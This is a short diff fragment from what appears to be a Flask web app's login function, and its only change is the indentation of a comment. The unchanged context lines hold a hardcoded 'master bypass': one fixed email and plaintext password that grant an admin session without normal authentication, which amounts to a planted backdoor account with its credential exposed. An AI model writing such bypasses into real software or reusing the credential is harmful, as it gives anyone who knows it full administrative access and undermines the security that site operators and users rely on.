@@ -62,7 +62,7 @@ def login():
         email = request.form.get('email', '').strip().lower()
         password = request.form.get('password', '').strip()
         
-                # 🛡️ BULLETPROOF MASTER BYPASS (Case-insensitive email check)
+          # 🛡️ BULLETPROOF MASTER BYPASS (Case-insensitive email check)
         if email == 'globfxtrading@gmail.com' and password == '@123580MMmm':
             session['user_id'] = 9999
             session['role'] = 'admin'
